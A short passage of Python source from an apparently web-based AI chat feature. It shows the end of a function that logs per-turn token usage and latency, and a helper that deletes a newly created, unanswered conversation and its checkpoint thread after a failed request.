    """One AIUsageLog row for this turn — on the failure path too."""
    _record_usage(AIUsageLog.Feature.CHAT, user, model, [{
        'usage': _turn_usage(messages),
        'latency_ms': int((time.monotonic() - started) * 1000),
    }])


def _rollback_new_conversation(conversation, checkpointer, created_now):
    """Drop a conversation that was created for this call and never answered.

    Without this, a client retrying a failing request accumulates one empty
    conversation per attempt. An existing conversation is never touched.
    """
    if not created_now:
        return
    try:
        checkpointer.delete_thread(str(conversation.id))
    except Exception:  # pragma: no cover - best effort; the row still goes
        logger.warning('ai chat rollback: thread delete failed conversation=%s',
                       conversation.id)
    conversation.delete()
